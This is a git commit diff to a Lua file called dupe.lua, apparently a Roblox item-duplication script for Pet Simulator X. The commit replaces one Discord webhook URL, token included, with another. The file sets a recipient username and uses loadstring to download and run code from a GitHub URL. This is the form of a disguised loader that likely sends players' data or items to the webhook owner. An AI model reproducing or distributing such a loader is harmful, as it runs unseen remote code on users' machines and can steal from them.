36dde3178148d486cfd7068669cf19f8dcbcd119
RuebanD <120219002+RuebanD@users.noreply.github.com>
2023-04-05 21:59:50 +0100

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,4 +1,4 @@
 UserName = "BIGBOYRUEB"
-WebHook = "https://discord.com/api/webhooks/1091819792618504334/lSjj2_c2r_R4TPpdZ0rJJK1BCO8pwcXPuCnesVHAdw6-foPVFoJJOCC-SYFzWDfIb7vG"
+WebHook = "https://discord.com/api/webhooks/1093275718286319626/MK_m0iiQWizPXZLLz1WIgM7j8itrj3tyME6JusXaMFXjPsVidDnd7VC59j9izl8QSMXc"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
